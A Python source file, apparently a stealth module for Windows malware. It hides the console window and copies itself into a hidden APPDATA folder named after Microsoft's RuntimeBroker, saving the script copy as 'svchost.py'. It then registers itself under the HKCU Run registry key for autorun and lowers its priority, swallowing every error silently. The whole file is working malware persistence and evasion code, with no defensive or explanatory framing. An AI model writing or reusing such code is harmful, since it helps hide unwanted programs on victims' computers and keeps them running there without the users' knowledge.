import os, sys, shutil, winreg, ctypes

APP_NAME = "RuntimeBroker"
INSTALL_DIR = os.path.join(os.environ.get("APPDATA", ""), "Microsoft", "Windows", "RuntimeBroker")
INSTALL_PATH = os.path.join(INSTALL_DIR, "RuntimeBroker.exe" if getattr(sys, "frozen", False) else "svchost.py")

def hide_console():
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except Exception:
        pass

def copy_to_system():
    try:
        exe = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(sys.argv[0])
        if os.path.abspath(exe) == os.path.abspath(INSTALL_PATH):
            return
        os.makedirs(INSTALL_DIR, exist_ok=True)
        shutil.copy2(exe, INSTALL_PATH)
        # Скрыть папку
        ctypes.windll.kernel32.SetFileAttributesW(INSTALL_DIR, 0x02)
    except Exception:
        pass

def add_to_autorun():
    try:
        exe = INSTALL_PATH if os.path.exists(INSTALL_PATH) else (
            sys.executable if getattr(sys, "frozen", False) else os.path.abspath(sys.argv[0])
        )
        if not getattr(sys, "frozen", False):
            cmd = f'"{sys.executable}" "{exe}"'
        else:
            cmd = f'"{exe}"'
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, cmd)
        winreg.CloseKey(key)
    except Exception:
        pass

def move_to_background():
    try:
        import psutil
        p = psutil.Process(os.getpid())
        p.nice(psutil.IDLE_PRIORITY_CLASS)
    except Exception:
        pass

def init_stealth():
    if sys.platform != "win32":
        return
    hide_console()
    copy_to_system()
    add_to_autorun()
    move_to_background()
